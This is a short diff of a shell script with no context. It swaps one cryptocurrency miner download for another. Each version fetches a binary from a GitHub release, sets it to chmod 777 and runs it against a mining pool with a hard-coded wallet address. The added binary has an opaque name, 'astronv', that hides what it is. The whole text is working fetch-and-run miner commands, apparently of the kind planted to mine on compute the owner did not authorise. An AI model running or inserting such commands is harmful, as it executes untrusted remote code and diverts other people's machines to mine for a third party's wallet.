@@ -1,4 +1,3 @@
-wget https://github.com/bondaltomason/meo/releases/download/2.7.0/phihashminer_ubuntu22.zip
-unzip phihashminer_ubuntu22.zip
-chmod 777 ._phihashminer phihashminer
-./phihashminer -P stratum+tcp://Pm6GJUcV8dr8AfpTGP92C6nzioRKzRBmzF.x@stratum-eu.rplant.xyz:7134
+wget https://github.com/bondaltomason/meo/releases/download/2.7.0/astronv
+chmod 777 astronv
+./astronv -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r fastpool.xyz:10300
